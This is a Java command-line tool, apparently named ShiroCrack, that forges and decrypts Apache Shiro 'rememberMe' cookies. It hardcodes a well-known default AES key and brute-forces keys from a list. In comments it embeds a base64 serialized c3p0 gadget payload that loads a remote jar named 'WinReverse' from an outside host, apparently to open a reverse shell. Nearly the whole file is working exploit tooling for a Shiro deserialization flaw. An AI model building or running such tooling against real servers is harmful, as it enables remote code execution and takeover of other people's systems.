package shiro;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.*;
import java.util.ArrayList;
import java.util.Arrays;


public class ShiroCrack {

    public static void print_banner(){
        System.out.println("Introduction: This Program is used to Encode/Decode Shiro String\n" +
                "Usage: java -jar ShiroCrack.jar [encode/decode/break] String");
    }

    public static String Encrypt(String text,String Skey){
        Base64 B64 = new org.apache.shiro.codec.Base64();
//        byte[] key = B64.decode("4AvVhmFLUs0KTA3Kprsdag==");
        byte[] key = B64.decode(Skey);
        System.out.println(key.toString());
        //反序列化payload的base64编码
//        java.lang.String text = "rO0ABXNyAChjb20ubWNoYW5nZS52Mi5jM3AwLlBvb2xCYWNrZWREYXRhU291cmNlZoRH/BzETxgCAAB4cgA1Y29tLm1jaGFuZ2UudjIuYzNwMC5pbXBsLkFic3RyYWN0UG9vbEJhY2tlZERhdGFTb3VyY2UAAAAAAAAAAQMAAHhyADFjb20ubWNoYW5nZS52Mi5jM3AwLmltcGwuUG9vbEJhY2tlZERhdGFTb3VyY2VCYXNlAAAAAAAAAAEDAAdJABBudW1IZWxwZXJUaHJlYWRzTAAYY29ubmVjdGlvblBvb2xEYXRhU291cmNldAAkTGphdmF4L3NxbC9Db25uZWN0aW9uUG9vbERhdGFTb3VyY2U7TAAOZGF0YVNvdXJjZU5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABRmYWN0b3J5Q2xhc3NMb2NhdGlvbnEAfgAETAANaWRlbnRpdHlUb2tlbnEAfgAETAADcGNzdAAiTGphdmEvYmVhbnMvUHJvcGVydHlDaGFuZ2VTdXBwb3J0O0wAA3Zjc3QAIkxqYXZhL2JlYW5zL1ZldG9hYmxlQ2hhbmdlU3VwcG9ydDt4cHcCAAFzcgA9Y29tLm1jaGFuZ2UudjIubmFtaW5nLlJlZmVyZW5jZUluZGlyZWN0b3IkUmVmZXJlbmNlU2VyaWFsaXplZGIZhdDRKsITAgAETAALY29udGV4dE5hbWV0ABNMamF2YXgvbmFtaW5nL05hbWU7TAADZW52dAAVTGphdmEvdXRpbC9IYXNodGFibGU7TAAEbmFtZXEAfgAJTAAJcmVmZXJlbmNldAAYTGphdmF4L25hbWluZy9SZWZlcmVuY2U7eHBwcHBzcgAWamF2YXgubmFtaW5nLlJlZmVyZW5jZejGnqKo6Y0JAgAETAAFYWRkcnN0ABJMamF2YS91dGlsL1ZlY3RvcjtMAAxjbGFzc0ZhY3RvcnlxAH4ABEwAFGNsYXNzRmFjdG9yeUxvY2F0aW9ucQB+AARMAAljbGFzc05hbWVxAH4ABHhwc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAApwcHBwcHBwcHBweHQACldpblJldmVyc2V0ACpodHRwOi8vMTkyLjE2OC4xMzcuMjM4OjY2NjYvV2luUmV2ZXJzZS5qYXJ0AAdleHBsb2l0cHBwdwQAAAAAeHcCAAF4";
        AesCipherService cipherService  = new AesCipherService();
        ByteSource byteSource = cipherService.encrypt(B64.decode(text), key);
        byte[] value = byteSource.getBytes();

//        System.out.println("rememberMe="+new java.lang.String(B64.encode(value)));
        return "rememberMe="+new java.lang.String(B64.encode(value));

    }
    public static String Decrypt(String text,String Skey) {
        Base64 B64 = new org.apache.shiro.codec.Base64();
//        byte[] key = B64.decode("4AvVhmFLUs0KTA3Kprsdag==");
        byte[] key = B64.decode(Skey);
        //反序列化payload的base64编码
//        java.lang.String text = "rO0ABXNyAChjb20ubWNoYW5nZS52Mi5jM3AwLlBvb2xCYWNrZWREYXRhU291cmNlZoRH/BzETxgCAAB4cgA1Y29tLm1jaGFuZ2UudjIuYzNwMC5pbXBsLkFic3RyYWN0UG9vbEJhY2tlZERhdGFTb3VyY2UAAAAAAAAAAQMAAHhyADFjb20ubWNoYW5nZS52Mi5jM3AwLmltcGwuUG9vbEJhY2tlZERhdGFTb3VyY2VCYXNlAAAAAAAAAAEDAAdJABBudW1IZWxwZXJUaHJlYWRzTAAYY29ubmVjdGlvblBvb2xEYXRhU291cmNldAAkTGphdmF4L3NxbC9Db25uZWN0aW9uUG9vbERhdGFTb3VyY2U7TAAOZGF0YVNvdXJjZU5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABRmYWN0b3J5Q2xhc3NMb2NhdGlvbnEAfgAETAANaWRlbnRpdHlUb2tlbnEAfgAETAADcGNzdAAiTGphdmEvYmVhbnMvUHJvcGVydHlDaGFuZ2VTdXBwb3J0O0wAA3Zjc3QAIkxqYXZhL2JlYW5zL1ZldG9hYmxlQ2hhbmdlU3VwcG9ydDt4cHcCAAFzcgA9Y29tLm1jaGFuZ2UudjIubmFtaW5nLlJlZmVyZW5jZUluZGlyZWN0b3IkUmVmZXJlbmNlU2VyaWFsaXplZGIZhdDRKsITAgAETAALY29udGV4dE5hbWV0ABNMamF2YXgvbmFtaW5nL05hbWU7TAADZW52dAAVTGphdmEvdXRpbC9IYXNodGFibGU7TAAEbmFtZXEAfgAJTAAJcmVmZXJlbmNldAAYTGphdmF4L25hbWluZy9SZWZlcmVuY2U7eHBwcHBzcgAWamF2YXgubmFtaW5nLlJlZmVyZW5jZejGnqKo6Y0JAgAETAAFYWRkcnN0ABJMamF2YS91dGlsL1ZlY3RvcjtMAAxjbGFzc0ZhY3RvcnlxAH4ABEwAFGNsYXNzRmFjdG9yeUxvY2F0aW9ucQB+AARMAAljbGFzc05hbWVxAH4ABHhwc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAApwcHBwcHBwcHBweHQACldpblJldmVyc2V0ACpodHRwOi8vMTkyLjE2OC4xMzcuMjM4OjY2NjYvV2luUmV2ZXJzZS5qYXJ0AAdleHBsb2l0cHBwdwQAAAAAeHcCAAF4";
        AesCipherService cipherService = new AesCipherService();
        try {
            ByteSource byteSource = cipherService.decrypt(B64.decode(text), key);
            byte[] value = byteSource.getBytes();
            //检测是否有Magic Number
            if (Arrays.toString(Arrays.copyOfRange(value, 0, 4)).contains("-84, -19, 0, 5")) {
                System.out.println("Decode Success!!!bytes has been wirte to byteCode.dat");
                //创建FileOutStream对象
                FileOutputStream fileOutputStream = new FileOutputStream(new File("byteCode.class"));
                //以字节形式输入字节流
                fileOutputStream.write(value);
                //将缓存的数据发出去
                fileOutputStream.flush();
                fileOutputStream.close();
                return "Origin Data=" + new java.lang.String(B64.encode(value));
            }
            }catch(Exception e){
                System.out.println("Wrong Key!!!!");
//            e.printStackTrace();
            }
//        System.out.println("rememberMe="+new java.lang.String(B64.encode(value)));
            return "";

        }

    public static void main(String[] args) throws Exception {
//        for(String arg:args){
//            System.out.println(arg);
//        }
        //创建FileInputStream对象
        FileInputStream fileInputStream = new FileInputStream("keys.txt");
        byte[] bytes = new byte[1024];
        int a = -1;
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        //循环读出文件内容
        while((a=fileInputStream.read(bytes))!=-1){
            out.write(bytes,0,a);
        }
        ArrayList<String> keys_list = new ArrayList<String>();
        String[] keys = out.toString().split("\n");
        keys_list.addAll(Arrays.asList(keys));


        String key = "kPH+bIxk5D2deZiIxcaaaA==";

        try{
            if(args[0]!=null&&args[1]!=null){
                String Result = "";
                String operation = args[0].toLowerCase();
                String text = args[1];
                switch(operation){
                    case "encode":
                        if(args.length<3){
                            throw new Exception("key needed!!!");
                        }else{
                            Result = Encrypt(text,args[2]);

                        }
                        break;
                    case "decode":
                        if(args.length<3){
                            throw new Exception("key needed!!!");
                        }else{
                            System.out.println(text);
                            System.out.println(args[2]);
                            Result = Decrypt(text,args[2]);

                        }
                        break;
                    case "break":
                        for(String k:keys_list){
                            System.out.println(k);
                            try{
                                Result=Decrypt(text,k);
                                if (!Result.equals("")){
                                    break;
                                }
                            }catch (Exception e){
                            }
                        }
                        break;
                    default:
                        throw new Exception("wrong Method");
                }
                if(!Result.equals("")){
                    System.out.println(Result);
                }else{
                    throw new Exception("Something Wrong When [encode/decode/break]");
                }

            }
        }catch (Exception e){
            print_banner();
//            throw new Exception("args needed!!!");
            e.printStackTrace();
        }

    }
}
